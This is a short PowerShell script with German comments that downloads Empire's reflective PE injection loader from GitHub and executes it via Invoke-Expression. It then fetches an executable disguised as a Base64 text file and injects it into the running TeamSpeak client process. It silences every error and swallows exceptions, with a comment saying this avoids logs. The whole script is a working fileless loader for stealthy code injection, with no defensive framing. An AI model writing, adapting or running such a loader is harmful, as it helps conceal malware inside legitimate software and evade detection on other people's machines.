$ErrorActionPreference = 'SilentlyContinue'

# Warte kurz, bis der Zielprozess stabil läuft
Start-Sleep -Seconds 5 

try {
    # TLS 1.2 für die Verbindung sicherstellen
    [Net.ServicePointManager]::SecurityProtocol = 3072
    
    # 1. Loader (Reflective Injection) direkt via Web-Request laden
    $loaderUrl = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
    $loaderContent = (iwr -UseBasicParsing $loaderUrl).Content
    Invoke-Expression $loaderContent

    # 2. Deine EXE (als Base64-Text getarnt) laden
    $exeUrl = "https://raw.githubusercontent.com/dein-user/dein-repo/main/johannesschwein.txt"
    $base64String = (iwr -UseBasicParsing $exeUrl).Content
    
    # In Byte-Array umwandeln
    $peBytes = [System.Convert]::FromBase64String($base64String)

    # 3. Injektion in den Zielprozess (z.B. TeamSpeak)
    $target = Get-Process ts3client_win64
    Invoke-ReflectivePEInjection -PEBytes $peBytes -ProcId $target.Id -ForceASLR
} catch {
    # Keine Ausgabe bei Fehlern zur Vermeidung von Logs
}
